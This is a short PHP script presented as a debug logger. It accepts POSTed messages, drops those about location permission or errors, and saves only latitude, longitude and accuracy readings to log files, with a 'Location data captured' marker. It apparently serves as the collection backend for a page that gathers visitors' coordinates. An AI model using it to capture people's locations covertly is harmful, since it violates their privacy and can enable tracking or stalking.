<?php

// Enable error logging
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', 'debug_errors.log');

header('Content-Type: application/json');

class DebugLogger {
    private const FILTERED_PHRASES = [
        "Location data sent",
        "getLocation called", 
        "Geolocation error",
        "Location permission denied",
        "Requesting location",
        "Getting your location"
    ];
    
    private const ESSENTIAL_PHRASES = [
        'Lat:',
        'Latitude:',
        'Lon:',
        'Longitude:',
        'Position obtained',
        'Location obtained',
        'Accuracy:'
    ];
    
    public function processRequest(): void {
        try {
            if (!$this->validateRequest()) {
                echo json_encode([
                    'status' => 'error', 
                    'message' => 'No message provided'
                ]);
                return;
            }
            
            $message = trim($_POST['message']);
            $date = date('Y-m-d H:i:s');
            
            if ($this->shouldLogMessage($message)) {
                $this->logMessage($date, $message);
                $this->createMarkerFile();
            }
            
            echo json_encode(['status' => 'success']);
            
        } catch (Exception $e) {
            error_log("DebugLogger error: " . $e->getMessage());
            echo json_encode([
                'status' => 'error',
                'message' => 'Internal server error'
            ]);
        }
    }
    
    private function validateRequest(): bool {
        return isset($_POST['message']) && !empty(trim($_POST['message']));
    }
    
    private function shouldLogMessage(string $message): bool {
        // Check if message should be filtered out
        foreach (self::FILTERED_PHRASES as $phrase) {
            if (stripos($message, $phrase) !== false) {
                return false;
            }
        }
        
        // Check if message contains essential location data
        foreach (self::ESSENTIAL_PHRASES as $phrase) {
            if (stripos($message, $phrase) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    private function logMessage(string $date, string $message): void {
        $logEntry = "[$date] " . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . PHP_EOL;
        
        if (file_put_contents("location_debug.log", $logEntry, FILE_APPEND | LOCK_EX) === false) {
            error_log("Failed to write to location_debug.log");
        }
    }
    
    private function createMarkerFile(): void {
        $marker = "Location data captured | " . date('Y-m-d H:i:s') . PHP_EOL;
        
        if (file_put_contents("LocationLog.log", $marker, FILE_APPEND | LOCK_EX) === false) {
            error_log("Failed to write to LocationLog.log");
        }
    }
}

// Execute the debug logging
$logger = new DebugLogger();
$logger->processRequest();
?>
